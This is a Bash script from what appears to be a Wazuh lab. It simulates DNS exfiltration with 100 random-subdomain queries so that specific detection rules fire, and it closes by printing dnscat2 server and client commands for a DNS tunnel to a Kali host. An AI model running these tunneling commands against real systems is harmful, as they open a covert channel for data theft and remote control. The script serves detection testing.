#!/bin/bash
# DNS Exfiltration Attack Simulation
# Target: Ubuntu Agent (10.10.10.20) or via Kali's own DNS
# Expected Wazuh Rules: 100005 (custom), 87001 (built-in)
# MITRE: T1048 (Exfiltration Over Alternative Protocol)

set -e

DNS_SERVER="10.10.10.11"  # Wazuh Indexer (also runs DNS)
QUERY_COUNT=100
DOMAIN="example.com"
DELAY=0.1

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] DNS Exfiltration Attack Simulation${NC}"
echo -e "${YELLOW}[*] DNS Server: $DNS_SERVER${NC}"
echo -e "${YELLOW}[*] Query Count: $QUERY_COUNT${NC}"
echo -e "${YELLOW}[*] Domain: $DOMAIN${NC}"
echo ""

# Check if DNS server is reachable
if ! ping -c 1 -W 2 "$DNS_SERVER" > /dev/null 2>&1; then
    echo -e "${RED}[!] DNS server $DNS_SERVER is not reachable${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] This will trigger Wazuh rules: 100005, 87001${NC}"
echo -e "${YELLOW}[*] MITRE: T1048 (Exfiltration Over Alternative Protocol)${NC}"
echo ""

# Generate high-entropy subdomains and query
echo -e "${GREEN}[*] Sending DNS queries with high-entropy subdomains...${NC}"

for i in $(seq 1 $QUERY_COUNT); do
    # Generate random subdomain (high entropy)
    RANDOM_SUB=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 16 | head -n 1)
    QUERY="${RANDOM_SUB}.exfil-${i}.${DOMAIN}"
    
    # Send DNS query
    dig @"$DNS_SERVER" "$QUERY" +short > /dev/null 2>&1 &
    
    # Progress indicator
    if [[ $((i % 10)) -eq 0 ]]; then
        echo -e "${GREEN}[*] Sent $i/$QUERY_COUNT queries...${NC}"
    fi
    
    sleep "$DELAY"
done

# Wait for background jobs
wait

echo ""
echo -e "${GREEN}[*] DNS exfiltration simulation completed${NC}"
echo -e "${GREEN}[*] Sent $QUERY_COUNT high-entropy DNS queries${NC}"
echo ""
echo -e "${GREEN}[*] Check Wazuh Dashboard for alerts:${NC}"
echo -e "    https://10.10.10.12:5601"
echo -e "    Filter: rule.id: 100005 OR 87001"
echo -e "    MITRE: T1048"
echo ""
echo -e "${YELLOW}[*] Note: For full DNS tunneling, use dnscat2 or iodine:${NC}"
echo -e "    # On Kali (server): ruby dnscat2.rb --dns=\"server=10.10.10.30,port=53\" --secret=secret"
echo -e "    # On Target (client): ./dnscat2 --dns=\"server=10.10.10.30,port=53\" --secret=secret yourdomain.com"